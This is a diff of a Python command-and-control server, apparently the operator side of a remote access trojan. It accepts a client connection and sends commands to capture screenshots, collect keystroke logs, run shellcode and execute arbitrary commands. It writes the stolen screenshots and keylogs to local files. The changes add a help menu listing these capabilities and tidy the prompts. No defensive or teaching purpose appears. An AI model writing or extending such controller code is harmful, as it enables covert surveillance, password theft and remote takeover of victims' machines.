@@ -8,11 +8,11 @@ def start_server():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((HOST, PORT))
     server.listen(5)
-    print(f"[*] Listening on {HOST}:{PORT}")
+    print(f"[*] Listening on {HOST}:{PORT}\n")
 
     while True:
         client_socket, addr = server.accept()
-        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
+        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}\n")
 
         # Handle client connection in a separate thread or process
         handle_client(client_socket)
@@ -20,10 +20,12 @@ def start_server():
 def handle_client(client_socket):
     try:
         while True:
-            command = input("Enter command to send to client (or type '/exit' to quit): ")
+            command = input("$: \n")
             if command == '/exit':
                 client_socket.send(command.encode('utf-8'))
                 break
+            elif command == 'help':
+                print("usage: -> screenshot\n       -> keylog\n       -> run_shellcode\n")
             elif command == 'screenshot':
                 client_socket.send(command.encode('utf-8'))
                 with open('received_screenshot.bmp', 'wb') as f:
@@ -33,7 +35,7 @@ def handle_client(client_socket):
                             f.write(chunk.replace(EOF_MARKER, b''))
                             break
                         f.write(chunk)
-                print("Screenshot received and saved as 'received_screenshot.bmp'.")
+                print("Screenshot received and saved as 'received_screenshot.bmp'.\n")
             elif command == 'keylog':
                 client_socket.send(command.encode('utf-8'))
                 with open('received_keylog.txt', 'w') as f:
@@ -43,7 +45,7 @@ def handle_client(client_socket):
                             f.write(chunk.replace(EOF_MARKER.decode('utf-8'), ''))
                             break
                         f.write(chunk)
-                print("Keylog received and saved as 'received_keylog.txt'.")
+                print("Keylog received and saved as 'received_keylog.txt'.\n")
             else:
                 client_socket.send(command.encode('utf-8'))
                 response = client_socket.recv(4096)
